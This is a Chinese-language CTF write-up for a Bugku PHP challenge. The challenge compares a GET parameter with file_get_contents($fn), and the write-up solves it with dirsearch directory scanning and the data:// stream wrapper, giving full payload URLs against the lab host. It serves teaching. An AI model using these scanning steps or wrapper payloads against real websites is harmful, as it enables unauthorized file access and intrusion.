# Bugku CTF Web题 `file_get_contents` Writeup

## 题目分析

题目核心是 PHP 函数 `file_get_contents()` 的利用，URL 中存在 `ac` 和 `fn` 两个 GET 参数。推测后端逻辑为：

```PHP

<?php
$ac = $_GET['ac'];
$fn = $_GET['fn'];
// 当 ac 参数值 与 fn 指定文件的内容一致时，输出 Flag
if ($ac === file_get_contents($fn)) {
    echo "flag{xxx}";
}
?>
```

解题关键是让 `ac` 的值与 `file_get_contents($fn)` 的返回值完全相等。

---

## 方法一：目录扫描 + 已知文件内容匹配

### 步骤 1：目录扫描发现敏感文件

使用目录扫描工具（如 `dirsearch`）对目标地址进行扫描：

```Bash

python3 dirsearch.py -u http://171.80.2.169:11427/ -e *
```

扫描结果中发现存在 `flag.txt` 文件，访问该文件：

```Plain Text

http://171.80.2.169:11427/flag.txt
```

得到其内容为：`bugku`。

### 步骤 2：构造 Payload 触发条件

已知 `flag.txt` 内容为 `bugku`，构造 URL 让 `ac` 参数与文件内容匹配：

```Plain Text

http://171.80.2.169:11427/?ac=bugku&fn=flag.txt
```

后端执行 `file_get_contents('flag.txt')` 返回 `bugku`，与 `ac=bugku` 相等，条件满足，页面返回 Flag。

---

## 方法二：伪协议绕过（`data://` 伪协议）

### 步骤 1：利用 `file_get_contents` 伪协议特性

PHP `file_get_contents()` 支持 `data://` 伪协议，可直接在 URL 中嵌入数据，格式为：

```Plain Text

data://[MIME类型][;charset=字符集][;base64],<数据内容>
```

当 `fn` 参数为 `data://text/plain,hello` 时，`file_get_contents($fn)` 会直接返回 `hello`。

### 步骤 2：验证伪协议可行性

构造简单 Payload 验证逻辑：

```Plain Text

http://171.80.2.169:11427/?ac=hello&fn=data://text/plain,hello
```

此时 `file_get_contents('data://text/plain,hello')` 返回 `hello`，与 `ac=hello` 相等，验证伪协议可绕过文件读取限制。

### 步骤 3：获取 Flag

直接构造任意匹配值的 Payload 即可触发 Flag 输出，例如：

```Plain Text

http://171.80.2.169:11427/?ac=test&fn=data://text/plain,test
```

或直接读取目标 Flag 文件（若已知路径）：

```Plain Text

http://171.80.2.169:11427/?ac=bugku&fn=flag.txt
```

（本质与方法一一致，但伪协议更灵活，无需依赖本地文件存在）

---

## 总结

|方法|核心思路|优点|缺点|
|---|---|---|---|
|目录扫描法|找到已知内容的文件，用文件内容匹配 `ac` 参数|直观易懂，无需特殊知识|依赖扫描工具，若文件隐藏则无法发现|
|伪协议绕过|利用 `data://` 伪协议直接在参数中构造数据，让 `ac` 与返回值匹配|无需依赖本地文件，通用性强|需要了解 PHP 伪协议特性|
最终 Flag 格式为 `flag{...}`，提交即可完成题目。
> （注：文档部分内容可能由 AI 生成）